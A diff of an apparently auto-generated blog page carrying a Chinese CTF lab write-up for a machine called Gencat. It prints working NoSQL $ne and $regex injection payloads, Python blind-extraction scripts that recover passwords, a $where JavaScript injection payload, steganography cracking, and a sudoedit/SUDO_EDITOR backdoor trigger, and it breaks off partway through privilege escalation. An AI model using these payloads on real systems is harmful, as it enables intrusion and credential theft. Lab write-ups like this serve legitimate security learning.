@@ -50,7 +50,7 @@ PORT      STATE SERVICE VERSION
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Gencat.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Gencat</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -74,7 +74,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -107,240 +117,212 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
-<pre lang="bash"><code>IP=192.168.205.172
-nmap -p- --min-rate 10000 $IP
-nmap -sV -sC -p22,80,5000,27017 $IP
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">IP=192.168.205.172
+nmap -p- --min-rate 10000 <span class="pl-smi">$IP</span>
+nmap -sV -sC -p22,80,5000,27017 <span class="pl-smi">$IP</span></pre></div>
 <p>四个端口全开：</p>
-<pre><code>PORT      STATE SERVICE VERSION
+<pre class="notranslate"><code class="notranslate">PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 10.0
 80/tcp    open  http    lighttpd 1.4.82
 5000/tcp  open  http    Werkzeug 3.1.5 (Python 3.12.12)
 27017/tcp open  mongodb MongoDB 4.4.6
 </code></pre>
-<p>27017 是 MongoDB，尝试直接 mongo 连上去枚举，没有认证凭据，<code>show dbs</code>、<code>show collections</code> 全部 Unauthorized。</p>
-<p>80 端口是 lighttpd 托管的静态页面，标题 &quot;NexGen Systems | Developer Portal&quot;，是一份 API 文档，给出了三个端点的调用格式。5000 端口就是实际的 Flask 服务。</p>
+<p>27017 是 MongoDB，尝试直接 mongo 连上去枚举，没有认证凭据，<code class="notranslate">show dbs</code>、<code class="notranslate">show collections</code> 全部 Unauthorized。</p>
+<p>80 端口是 lighttpd 托管的静态页面，标题 "NexGen Systems | Developer Portal"，是一份 API 文档，给出了三个端点的调用格式。5000 端口就是实际的 Flask 服务。</p>
 <p>文档里的暗示相当直白：</p>
 <ul>
-<li><code>POST /api/v1/auth/login</code> 的 password 字段类型标注为 <code>string | object</code>，明示 NoSQL 注入</li>
-<li><code>POST /api/v2/resource/metadata</code> 描述里写 &quot;pattern-matching filtering&quot;，支持操作符查询</li>
-<li><code>GET /api/v3/system/diagnostic?probe_id={id}</code> 写着 &quot;JS-engine evaluation&quot;，还提到会注入 <code>env_flag</code> 做遥测审计</li>
+<li><code class="notranslate">POST /api/v1/auth/login</code> 的 password 字段类型标注为 <code class="notranslate">string | object</code>，明示 NoSQL 注入</li>
+<li><code class="notranslate">POST /api/v2/resource/metadata</code> 描述里写 "pattern-matching filtering"，支持操作符查询</li>
+<li><code class="notranslate">GET /api/v3/system/diagnostic?probe_id={id}</code> 写着 "JS-engine evaluation"，还提到会注入 <code class="notranslate">env_flag</code> 做遥测审计</li>
 </ul>
-<p>页面底部三行注释更直接：<code>document-oriented storage</code>、<code>operator-based overrides</code>、<code>JS-engine evaluation</code>，等于把攻击面全摆台面上了。</p>
+<p>页面底部三行注释更直接：<code class="notranslate">document-oriented storage</code>、<code class="notranslate">operator-based overrides</code>、<code class="notranslate">JS-engine evaluation</code>，等于把攻击面全摆台面上了。</p>
 <h1>NoSQL 注入与密码提取</h1>
 <h2>登录绕过</h2>
-<p>password 支持 object 类型，直接用 <code>$ne</code> 绕：</p>
-<pre lang="bash"><code>curl -s http://$IP:5000/api/v1/auth/login -H &quot;Content-Type: application/json&quot; -d '{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:null}}'
-</code></pre>
-<pre lang="json"><code>{&quot;role&quot;:&quot;viewer&quot;,&quot;status&quot;:&quot;authenticated&quot;,&quot;token&quot;:&quot;eyJ...&quot;}
-</code></pre>
+<p>password 支持 object 类型，直接用 <code class="notranslate">$ne</code> 绕：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl -s http://<span class="pl-smi">$IP</span>:5000/api/v1/auth/login -H <span class="pl-s"><span class="pl-pds">"</span>Content-Type: application/json<span class="pl-pds">"</span></span> -d <span class="pl-s"><span class="pl-pds">'</span>{"username":"admin","password":{"$ne":null}}<span class="pl-pds">'</span></span></pre></div>
+<div class="highlight highlight-source-json"><pre class="notranslate">{<span class="pl-ent">"role"</span>:<span class="pl-s"><span class="pl-pds">"</span>viewer<span class="pl-pds">"</span></span>,<span class="pl-ent">"status"</span>:<span class="pl-s"><span class="pl-pds">"</span>authenticated<span class="pl-pds">"</span></span>,<span class="pl-ent">"token"</span>:<span class="pl-s"><span class="pl-pds">"</span>eyJ...<span class="pl-pds">"</span></span>}</pre></div>
 <p>登录成功但 role 是 viewer，不是 admin。这里卡了挺久，后来拿到源码才知道，代码里专门判断了如果 username 是 admin 且 password 是 dict 类型，会强制降级为 viewer。想拿 admin 权限的 token 必须用真实密码登录。</p>
-<p>而且后面两个接口的鉴权头是 <code>Authorization: &lt;JWT&gt;</code> 而不是 <code>Authorization: Bearer &lt;JWT&gt;</code>，一开始加了 Bearer 前缀一直 403，在这上面也浪费了不少时间。</p>
+<p>而且后面两个接口的鉴权头是 <code class="notranslate">Authorization: &lt;JWT&gt;</code> 而不是 <code class="notranslate">Authorization: Bearer &lt;JWT&gt;</code>，一开始加了 Bearer 前缀一直 403，在这上面也浪费了不少时间。</p>
 <h2>盲注提取密码</h2>
-<p>login 端点配合 <code>$regex</code> 可以做布尔盲注。认证成功返回 <code>authenticated</code>，失败返回 <code>failed</code>，区分度很好。</p>
-<p>保存为 <code>blind.py</code> 执行：</p>
-<pre lang="python"><code>import requests, string
+<p>login 端点配合 <code class="notranslate">$regex</code> 可以做布尔盲注。认证成功返回 <code class="notranslate">authenticated</code>，失败返回 <code class="notranslate">failed</code>，区分度很好。</p>
+<p>保存为 <code class="notranslate">blind.py</code> 执行：</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">requests</span>, <span class="pl-s1">string</span>
 
-url = &quot;http://192.168.205.172:5000/api/v1/auth/login&quot;
-headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}
-chars = string.ascii_letters + string.digits + &quot;!@#$%^&amp;*()_+-=.,&quot;
+<span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.172:5000/api/v1/auth/login"</span>
+<span class="pl-s1">headers</span> <span class="pl-c1">=</span> {<span class="pl-s">"Content-Type"</span>: <span class="pl-s">"application/json"</span>}
+<span class="pl-s1">chars</span> <span class="pl-c1">=</span> <span class="pl-s1">string</span>.<span class="pl-c1">ascii_letters</span> <span class="pl-c1">+</span> <span class="pl-s1">string</span>.<span class="pl-c1">digits</span> <span class="pl-c1">+</span> <span class="pl-s">"!@#$%^&amp;*()_+-=.,"</span>
 
-def esc(s):
-    out = &quot;&quot;
-    for c in s:
-        if c in r'\.+*?^${}()|[]':
-            out += '\\' + c
-        else:
-            out += c
-    return out
+<span class="pl-k">def</span> <span class="pl-en">esc</span>(<span class="pl-s1">s</span>):
+    <span class="pl-s1">out</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
+    <span class="pl-k">for</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s1">s</span>:
+        <span class="pl-k">if</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s">r'\.+*?^${}()|[]'</span>:
+            <span class="pl-s1">out</span> <span class="pl-c1">+=</span> <span class="pl-s">'<span class="pl-cce">\\</span>'</span> <span class="pl-c1">+</span> <span class="pl-s1">c</span>
+        <span class="pl-k">else</span>:
+            <span class="pl-s1">out</span> <span class="pl-c1">+=</span> <span class="pl-s1">c</span>
+    <span class="pl-k">return</span> <span class="pl-s1">out</span>
 
-for user in [&quot;admin&quot;, &quot;guest&quot;, &quot;operator&quot;]:
-    pwd = &quot;&quot;
-    for i in range(50):
-        found = False
-        for c in chars:
-            payload = {&quot;username&quot;: user, &quot;password&quot;: {&quot;$regex&quot;: &quot;^&quot; + esc(pwd + c)}}
-            r = requests.post(url, json=payload, headers=headers, timeout=5)
-            if &quot;token&quot; in r.text:
-                pwd += c
-                found = True
-                break
-        if not found:
-            break
-    print(f&quot;{user}: {pwd}&quot;)
-</code></pre>
-<pre lang="bash"><code>python3 blind.py
-</code></pre>
+<span class="pl-k">for</span> <span class="pl-s1">user</span> <span class="pl-c1">in</span> [<span class="pl-s">"admin"</span>, <span class="pl-s">"guest"</span>, <span class="pl-s">"operator"</span>]:
+    <span class="pl-s1">pwd</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
+    <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">50</span>):
+        <span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">False</span>
+        <span class="pl-k">for</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-s1">chars</span>:
+            <span class="pl-s1">payload</span> <span class="pl-c1">=</span> {<span class="pl-s">"username"</span>: <span class="pl-s1">user</span>, <span class="pl-s">"password"</span>: {<span class="pl-s">"$regex"</span>: <span class="pl-s">"^"</span> <span class="pl-c1">+</span> <span class="pl-en">esc</span>(<span class="pl-s1">pwd</span> <span class="pl-c1">+</span> <span class="pl-s1">c</span>)}}
+            <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-s1">url</span>, <span class="pl-s1">json</span><span class="pl-c1">=</span><span class="pl-s1">payload</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>)
+            <span class="pl-k">if</span> <span class="pl-s">"token"</span> <span class="pl-c1">in</span> <span class="pl-s1">r</span>.<span class="pl-c1">text</span>:
+                <span class="pl-s1">pwd</span> <span class="pl-c1">+=</span> <span class="pl-s1">c</span>
+                <span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">True</span>
+                <span class="pl-k">break</span>
+        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found</span>:
+            <span class="pl-k">break</span>
+    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">user</span><span class="pl-kos">}</span></span>: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">pwd</span><span class="pl-kos">}</span></span>"</span>)</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python3 blind.py</pre></div>
 <p>三组凭据提取出来：</p>
 <ul>
-<li>admin: <code>P@ss_Str0ng_9821</code></li>
-<li>guest: <code>guest_pw_123</code></li>
-<li>operator: <code>op_secure_992</code></li>
+<li>admin: <code class="notranslate">P@ss_Str0ng_9821</code></li>
+<li>guest: <code class="notranslate">guest_pw_123</code></li>
+<li>operator: <code class="notranslate">op_secure_992</code></li>
 </ul>
 <p>用 admin 明文密码重新登录，拿到 admin role 的 token：</p>
-<pre lang="bash"><code>TOKEN=$(curl -s http://$IP:5000/api/v1/auth/login -H &quot;Content-Type: application/json&quot; -d '{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;P@ss_Str0ng_9821&quot;}' | python3 -c &quot;import sys,json;print(json.load(sys.stdin)['token'])&quot;)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">TOKEN=<span class="pl-s"><span class="pl-pds">$(</span>curl -s http://<span class="pl-smi">$IP</span>:5000/api/v1/auth/login -H <span class="pl-s"><span class="pl-pds">"</span>Content-Type: application/json<span class="pl-pds">"</span></span> -d <span class="pl-s"><span class="pl-pds">'</span>{"username":"admin","password":"P@ss_Str0ng_9821"}<span class="pl-pds">'</span></span> <span class="pl-k">|</span> python3 -c <span class="pl-s"><span class="pl-pds">"</span>import sys,json;print(json.load(sys.stdin)['token'])<span class="pl-pds">"</span></span><span class="pl-pds">)</span></span></pre></div>
 <h2>v2 端点枚举用户</h2>
 <p>v2 不是主线必要步骤，仅用于验证用户表内容。拿到 admin token 后用 metadata 端点做了下枚举，确认系统中存在 3 个用户：guest(uid=101)、operator(uid=102)、admin(uid=999)。密码和前面盲注结果一致，没发现其他有用字段。</p>
 <h1>JS 注入提取 SSH 凭据</h1>
-<p>diagnostic 端点的 <code>probe_id</code> 参数存在 <code>$where</code> 注入。文档提到会把 <code>env_flag</code> 注入到 JS 执行上下文中，思路就是通过注入把这个变量的值读出来。</p>
-<p>用 <code>env_flag.startsWith()</code> 做布尔盲注，逐字符提取。保存为 <code>flag.py</code> 执行：</p>
-<pre lang="python"><code>import requests, string
+<p>diagnostic 端点的 <code class="notranslate">probe_id</code> 参数存在 <code class="notranslate">$where</code> 注入。文档提到会把 <code class="notranslate">env_flag</code> 注入到 JS 执行上下文中，思路就是通过注入把这个变量的值读出来。</p>
+<p>用 <code class="notranslate">env_flag.startsWith()</code> 做布尔盲注，逐字符提取。保存为 <code class="notranslate">flag.py</code> 执行：</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">requests</span>, <span class="pl-s1">string</span>
 
-BASE = &quot;http://192.168.205.172:5000&quot;
-TOKEN = &quot;&lt;admin_token&gt;&quot;
-CHARSET = string.ascii_letters + string.digits + &quot;_{}-!@#$%^&amp;*().,:&quot;
+<span class="pl-c1">BASE</span> <span class="pl-c1">=</span> <span class="pl-s">"http://192.168.205.172:5000"</span>
+<span class="pl-c1">TOKEN</span> <span class="pl-c1">=</span> <span class="pl-s">"&lt;admin_token&gt;"</span>
+<span class="pl-c1">CHARSET</span> <span class="pl-c1">=</span> <span class="pl-s1">string</span>.<span class="pl-c1">ascii_letters</span> <span class="pl-c1">+</span> <span class="pl-s1">string</span>.<span class="pl-c1">digits</span> <span class="pl-c1">+</span> <span class="pl-s">"_{}-!@#$%^&amp;*().,:"</span>
 
-def is_true(expr):
-    payload = f&quot;0' || ({expr}) || '1'=='2&quot;
-    r = requests.get(f&quot;{BASE}/api/v3/system/diagnostic&quot;, params={&quot;probe_id&quot;: payload}, headers={&quot;Authorization&quot;: TOKEN}, timeout=8)
-    return '&quot;status&quot;:&quot;Online&quot;' in r.text
+<span class="pl-k">def</span> <span class="pl-en">is_true</span>(<span class="pl-s1">expr</span>):
+    <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">f"0' || (<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">expr</span><span class="pl-kos">}</span></span>) || '1'=='2"</span>
+    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">get</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">BASE</span><span class="pl-kos">}</span></span>/api/v3/system/diagnostic"</span>, <span class="pl-s1">params</span><span class="pl-c1">=</span>{<span class="pl-s">"probe_id"</span>: <span class="pl-s1">payload</span>}, <span class="pl-s1">headers</span><span class="pl-c1">=</span>{<span class="pl-s">"Authorization"</span>: <span class="pl-c1">TOKEN</span>}, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">8</span>)
+    <span class="pl-k">return</span> <span class="pl-s">'"status":"Online"'</span> <span class="pl-c1">in</span> <span class="pl-s1">r</span>.<span class="pl-c1">text</span>
 
-flag = &quot;&quot;
-for _ in range(80):
-    hit = False
-    for ch in CHARSET:
-        trial = flag + ch
-        trial_esc = trial.replace(&quot;\\&quot;, &quot;\\\\&quot;).replace(&quot;'&quot;, &quot;\\'&quot;)
-        if is_true(f&quot;env_flag.startsWith('{trial_esc}')&quot;):
-            flag += ch
-            hit = True
-            print(&quot;[+]&quot;, flag)
-            break
-    if not hit:
-        break
-print(&quot;FINAL:&quot;, flag)
-</code></pre>
-<pre lang="bash"><code>python3 flag.py
-</code></pre>
-<p>逐字符跑出来：<code>FLAG{cat:c4tc4tc4t}</code></p>
-<p>也可以用更暴力的方式，通过 <code>this.constructor.constructor</code> 在 Function 构造器里执行代码，配合 <code>throw</code> 把结果通过错误信息外带：</p>
-<pre lang="bash"><code>curl -s --get &quot;http://$IP:5000/api/v3/system/diagnostic&quot; --data-urlencode &quot;probe_id=1' || this.constructor.constructor('throw arguments.callee.caller.toString()')() || '1'=='&quot; -H &quot;Authorization: $TOKEN&quot;
-</code></pre>
+<span class="pl-s1">flag</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
+<span class="pl-k">for</span> <span class="pl-s1">_</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">80</span>):
+    <span class="pl-s1">hit</span> <span class="pl-c1">=</span> <span class="pl-c1">False</span>
+    <span class="pl-k">for</span> <span class="pl-s1">ch</span> <span class="pl-c1">in</span> <span class="pl-c1">CHARSET</span>:
+        <span class="pl-s1">trial</span> <span class="pl-c1">=</span> <span class="pl-s1">flag</span> <span class="pl-c1">+</span> <span class="pl-s1">ch</span>
+        <span class="pl-s1">trial_esc</span> <span class="pl-c1">=</span> <span class="pl-s1">trial</span>.<span class="pl-c1">replace</span>(<span class="pl-s">"<span class="pl-cce">\\</span>"</span>, <span class="pl-s">"<span class="pl-cce">\\</span><span class="pl-cce">\\</span>"</span>).<span class="pl-c1">replace</span>(<span class="pl-s">"'"</span>, <span class="pl-s">"<span class="pl-cce">\\</span>'"</span>)
+        <span class="pl-k">if</span> <span class="pl-en">is_true</span>(<span class="pl-s">f"env_flag.startsWith('<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">trial_esc</span><span class="pl-kos">}</span></span>')"</span>):
+            <span class="pl-s1">flag</span> <span class="pl-c1">+=</span> <span class="pl-s1">ch</span>
+            <span class="pl-s1">hit</span> <span class="pl-c1">=</span> <span class="pl-c1">True</span>
+            <span class="pl-en">print</span>(<span class="pl-s">"[+]"</span>, <span class="pl-s1">flag</span>)
+            <span class="pl-k">break</span>
+    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">hit</span>:
+        <span class="pl-k">break</span>
+<span class="pl-en">print</span>(<span class="pl-s">"FINAL:"</span>, <span class="pl-s1">flag</span>)</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python3 flag.py</pre></div>
+<p>逐字符跑出来：<code class="notranslate">FLAG{cat:c4tc4tc4t}</code></p>
+<p>也可以用更暴力的方式，通过 <code class="notranslate">this.constructor.constructor</code> 在 Function 构造器里执行代码，配合 <code class="notranslate">throw</code> 把结果通过错误信息外带：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl -s --get <span class="pl-s"><span class="pl-pds">"</span>http://<span class="pl-smi">$IP</span>:5000/api/v3/system/diagnostic<span class="pl-pds">"</span></span> --data-urlencode <span class="pl-s"><span class="pl-pds">"</span>probe_id=1' || this.constructor.constructor('throw arguments.callee.caller.toString()')() || '1'=='<span class="pl-pds">"</span></span> -H <span class="pl-s"><span class="pl-pds">"</span>Authorization: <span class="pl-smi">$TOKEN</span><span class="pl-pds">"</span></span></pre></div>
 <p>错误信息里直接返回了完整的 $where 函数源码：</p>
-<pre><code>function() { var env_flag='FLAG{cat:c4tc4tc4t}'; return this.uid == '1' || ... }
+<pre class="notranslate"><code class="notranslate">function() { var env_flag='FLAG{cat:c4tc4tc4t}'; return this.uid == '1' || ... }
 </code></pre>
-<p><code>FLAG{cat:c4tc4tc4t}</code> 的格式是 <code>用户名:密码</code>，这就是 SSH 的登录凭据。</p>
+<p><code class="notranslate">FLAG{cat:c4tc4tc4t}</code> 的格式是 <code class="notranslate">用户名:密码</code>，这就是 SSH 的登录凭据。</p>
 <h1>获取初始 Shell</h1>
-<pre lang="bash"><code>ssh cat@$IP
-</code></pre>
-<p>密码 <code>c4tc4tc4t</code>，成功登录。</p>
-<p>上来后执行 <code>cat user.txt</code> 看到一堆莫名其妙的编译日志在刷屏，非常诡异。研究了一下发现 <code>/usr/bin/cat</code> 被替换了：</p>
-<pre lang="bash"><code>which cat
-head -n 5 /usr/bin/cat
-</code></pre>
-<p><code>/usr/bin/cat</code> 实际是一个脚本，内容指向 <code>/bin/gencat</code>（genact，一个假终端活动生成器）。需要用 busybox 的真 cat 或者其他读取方式绕过：</p>
-<pre lang="bash"><code>busybox cat /home/cat/user.txt
-# 或者
-tac /home/cat/user.txt
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ssh cat@<span class="pl-smi">$IP</span></pre></div>
+<p>密码 <code class="notranslate">c4tc4tc4t</code>，成功登录。</p>
+<p>上来后执行 <code class="notranslate">cat user.txt</code> 看到一堆莫名其妙的编译日志在刷屏，非常诡异。研究了一下发现 <code class="notranslate">/usr/bin/cat</code> 被替换了：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">which cat
+head -n 5 /usr/bin/cat</pre></div>
+<p><code class="notranslate">/usr/bin/cat</code> 实际是一个脚本，内容指向 <code class="notranslate">/bin/gencat</code>（genact，一个假终端活动生成器）。需要用 busybox 的真 cat 或者其他读取方式绕过：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">busybox cat /home/cat/user.txt
+<span class="pl-c"><span class="pl-c">#</span> 或者</span>
+tac /home/cat/user.txt</pre></div>
 <h1>横向移动到 dog</h1>
-<p>做文件时间线分析时注意到 <code>/var/www/localhost/static/shamao.jpg</code>，279KB，修改时间 2026-02-06，在一堆系统文件里很突兀。还有个 <code>/var/www/localhost/static/.trash</code> 内容是 <code>Maybe you should find a backdoor?</code>。</p>
+<p>做文件时间线分析时注意到 <code class="notranslate">/var/www/localhost/static/shamao.jpg</code>，279KB，修改时间 2026-02-06，在一堆系统文件里很突兀。还有个 <code class="notranslate">/var/www/localhost/static/.trash</code> 内容是 <code class="notranslate">Maybe you should find a backdoor?</code>。</p>
 <p>把图片拉回 Kali 跑 stegseek：</p>
-<pre lang="bash"><code>stegseek shamao.jpg /usr/share/wordlists/rockyou.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">stegseek shamao.jpg /usr/share/wordlists/rockyou.txt</pre></div>
+<pre class="notranslate"><code class="notranslate">[i] Found passphrase: "Serialace"
+[i] Original filename: "pass.txt"
+[i] Extracting to "shamao.jpg.out"
 </code></pre>
-<pre><code>[i] Found passphrase: &quot;Serialace&quot;
-[i] Original filename: &quot;pass.txt&quot;
-[i] Extracting to &quot;shamao.jpg.out&quot;
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat shamao.jpg.out</pre></div>
+<pre class="notranslate"><code class="notranslate">eKCy4MrdnDAuQwcR
 </code></pre>
-<pre lang="bash"><code>cat shamao.jpg.out
-</code></pre>
-<pre><code>eKCy4MrdnDAuQwcR
-</code></pre>
-<p>这个字符串是 base62 编码，解码后是 <code>d0ggd0ggd0gg</code>，这是 dog 用户的密码。</p>
-<pre lang="bash"><code>su - dog
-</code></pre>
-<p>输入 <code>d0ggd0ggd0gg</code>，成功切换。</p>
+<p>这个字符串是 base62 编码，解码后是 <code class="notranslate">d0ggd0ggd0gg</code>，这是 dog 用户的密码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">su - dog</pre></div>
+<p>输入 <code class="notranslate">d0ggd0ggd0gg</code>，成功切换。</p>
 <h1>提权到 root</h1>
 <h2>sudo 权限与后门分析</h2>
-<pre lang="bash"><code>sudo -l
-</code></pre>
-<pre><code>Defaults!/usr/sbin/visudo env_keep+=&quot;SUDO_EDITOR EDITOR VISUAL PATH&quot;
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -l</pre></div>
+<pre class="notranslate"><code class="notranslate">Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL PATH"
 (ALL) NOPASSWD: sudoedit /etc/motd
 </code></pre>
-<p>dog 可以用 sudoedit 以 root 身份编辑 <code>/etc/motd</code>，且 <code>SUDO_EDITOR</code> 环境变量会被保留。</p>
-<p>之前 linpeas 扫的时候就发现系统在运行一个叫 backdoor 的进程。查看 <code>/etc/local.d/backdoor.start</code>：</p>
-<pre lang="bash"><code>busybox cat /etc/local.d/backdoor.start
-</code></pre>
-<pre lang="sh"><code>#!/bin/sh
-TARGET_FILE=&quot;/etc/motd&quot;
-TARGET_HASH=&quot;5399e8634cc0be890edaf70a1c825c64&quot;
-EXPLOIT_TARGET=&quot;/etc/group&quot;
+<p>dog 可以用 sudoedit 以 root 身份编辑 <code class="notranslate">/etc/motd</code>，且 <code class="notranslate">SUDO_EDITOR</code> 环境变量会被保留。</p>
+<p>之前 linpeas 扫的时候就发现系统在运行一个叫 backdoor 的进程。查看 <code class="notranslate">/etc/local.d/backdoor.start</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">busybox cat /etc/local.d/backdoor.start</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/sh</span>
+TARGET_FILE=<span class="pl-s"><span class="pl-pds">"</span>/etc/motd<span class="pl-pds">"</span></span>
+TARGET_HASH=<span class="pl-s"><span class="pl-pds">"</span>5399e8634cc0be890edaf70a1c825c64<span class="pl-pds">"</span></span>
+EXPLOIT_TARGET=<span class="pl-s"><span class="pl-pds">"</span>/etc/group<span class="pl-pds">"</span></span>
 {
-    while true; do
-        inotifywait -q -e close_write &quot;$TARGET_FILE&quot;
-        CURRENT_HASH=$(md5sum &quot;$TARGET_FILE&quot; | awk '{print $1}')
-        if [ &quot;$CURRENT_HASH&quot; = &quot;$TARGET_HASH&quot; ]; then
-            chmod o+w &quot;$EXPLOIT_TARGET&quot;
-        fi
-    done
-} &amp;
-</code></pre>
-<p>用 inotifywait 监控 <code>/etc/motd</code>，MD5 匹配 <code>5399e8634cc0be890edaf70a1c825c64</code> 时把 <code>/etc/group</code> 改成所有人可写。cmd5 查了一下这个哈希，对应的明文是 <code>0e123456</code>。</p>
-<pre lang="bash"><code>echo -n &quot;0e123456&quot; | md5sum
-</code></pre>
-<pre><code>5399e8634cc0be890edaf70a1c825c64
+    <span class="pl-k">while</span> <span class="pl-c1">true</span><span class="pl-k">;</span> <span class="pl-k">do</span>
+        inotifywait -q -e close_write <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$TARGET_FILE</span><span class="pl-pds">"</span></span>
+        CURRENT_HASH=<span class="pl-s"><span class="pl-pds">$(</span>md5sum <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$TARGET_FILE</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print $1}<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
+        <span class="pl-k">if</span> [ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$CURRENT_HASH</span><span class="pl-pds">"</span></span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$TARGET_HASH</span><span class="pl-pds">"</span></span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+            chmod o+w <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$EXPLOIT_TARGET</span><span class="pl-pds">"</span></span>
+        <span class="pl-k">fi</span>
+    <span class="pl-k">done</span>
+} <span class="pl-k">&amp;</span></pre></div>
+<p>用 inotifywait 监控 <code class="notranslate">/etc/motd</code>，MD5 匹配 <code class="notranslate">5399e8634cc0be890edaf70a1c825c64</code> 时把 <code class="notranslate">/etc/group</code> 改成所有人可写。cmd5 查了一下这个哈希，对应的明文是 <code class="notranslate">0e123456</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> -n <span class="pl-s"><span class="pl-pds">"</span>0e123456<span class="pl-pds">"</span></span> <span class="pl-k">|</span> md5sum</pre></div>
+<pre class="notranslate"><code class="notranslate">5399e8634cc0be890edaf70a1c825c64
 </code></pre>
 <h2>触发后门</h2>
-<p>直接 <code>sudoedit /etc/motd</code> 用 vim 编辑的话，保存时会自动加一个换行符导致 MD5 不匹配。可以在 vim 里 <code>:set noeol binary</code> 再保存，或者用 <code>SUDO_EDITOR</code> 指定一个自定义脚本精确控制写入内容：</p>
-<pre lang="bash"><code>printf '#!/bin/sh\nprintf &quot;0e123456&quot; &gt; &quot;$1&quot;\n' &gt; /tmp/notrail.sh
+<p>直接 <code class="notranslate">sudoedit /etc/motd</code> 用 vim 编辑的话，保存时会自动加一个换行符导致 MD5 不匹配。可以在 vim 里 <code class="notranslate">:set noeol binary</code> 再保存，或者用 <code class="notranslate">SUDO_EDITOR</code> 指定一个自定义脚本精确控制写入内容：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span>#!/bin/sh\nprintf "0e123456" &gt; "$1"\n<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /tmp/notrail.sh
 chmod +x /tmp/notrail.sh
-SUDO_EDITOR=&quot;/tmp/notrail.sh&quot; sudoedit /etc/motd
-</code></pre>
+SUDO_EDITOR=<span class="pl-s"><span class="pl-pds">"</span>/tmp/notrail.sh<span class="pl-pds">"</span></span> sudoedit /etc/motd</pre></div>
 <p>验证 MD5：</p>
-<pre lang="bash"><code>md5sum /etc/motd
-</code></pre>
-<pre><code>5399e8634cc0be890edaf70a1c825c64  /etc/motd
+<div class="highlight highlight-source-shell"><pre class="notranslate">md5sum /etc/motd</pre></div>
